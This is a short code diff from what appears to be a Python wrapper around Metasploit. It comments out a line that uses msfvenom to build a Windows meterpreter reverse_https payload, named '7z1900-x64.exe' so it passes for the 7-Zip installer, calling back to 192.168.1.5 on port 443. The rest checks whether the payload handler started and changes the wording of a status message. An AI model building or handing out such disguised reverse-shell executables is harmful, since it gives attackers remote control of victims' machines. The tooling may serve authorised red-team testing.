@@ -3,8 +3,8 @@ import subprocess
 
 def init(client):
     #Create exe payload using msfvenom
-    print("[-] Creating exe payload using msfvenom")
-    subprocess.call("msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=443 -f exe > 7z1900-x64.exe",shell=True)
+    #print("[-] Creating exe payload using msfvenom")
+    #subprocess.call("msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=443 -f exe > 7z1900-x64.exe",shell=True)
     
     fail=''
     handler=''
@@ -28,7 +28,7 @@ def init(client):
             fail = snippet.split('Exploit failed: ')
         x+=1
     if(len(fail)>1):
-        handler = "Handler failed to start...Is there a server using port {}?".format(httpspl['LPORT'])
+        handler = "Handler failed to start...is there a server using port {}?".format(httpspl['LPORT'])
     else:
         handler = "Handler started successfully"
     print("[+] " + handler)
